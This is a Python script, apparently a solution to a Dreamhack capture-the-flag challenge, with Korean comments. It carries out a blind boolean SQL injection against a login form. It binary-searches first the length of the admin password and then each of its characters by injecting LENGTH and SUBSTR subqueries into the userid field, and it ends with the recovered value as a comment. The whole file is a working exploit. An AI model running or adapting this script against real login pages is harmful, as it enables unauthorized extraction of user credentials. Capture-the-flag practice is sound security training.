import requests
import time

url ='http://host3.dreamhack.games:22929/login'
params = {'userid': '', 'userpassword': ''}

# 1. admin의 비밀번호의 길이 알아내기
def find_password_length(user):
    start = 0
    end = 100
    while True:
        mid = (start + end) // 2
        query = f'\" or ((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{mid});--'
        params['userid'] = query
        params['userpassword'] = 'testestset'
        data = requests.post(url, data=params).text
        
        if start == mid:
            return mid

        if 'hello admin flag is' in data:
            end = mid
        else:
            start = mid
        time.sleep(1)

pw_length = find_password_length('admin')
print(pw_length)

# 2. admin의 비밀번호 알아내기
def find_password(user, pw_length):
    password = ''
    for i in range(pw_length):
        start = 0
        end = 129
        while True:
            mid = (start + end) // 2
            query = f'\" or (SELECT SUBSTR((SELECT userpassword WHERE userid=\"{user}\"), {i+1}, 1)) < CHAR({mid});--'
            params['userid'] = query
            params['userpassword'] = 'testestset'
            data = requests.post(url, data=params).text

            if start == mid:
                print(mid)
                password += chr(mid)
                print(password)
                break

            if 'hello admin flag is' in data:
                end = mid
            else:
                start = mid
            time.sleep(0.5)
    return password

print(find_password('admin', pw_length))
# 0ecca12d582cc4ad34673170d2872294
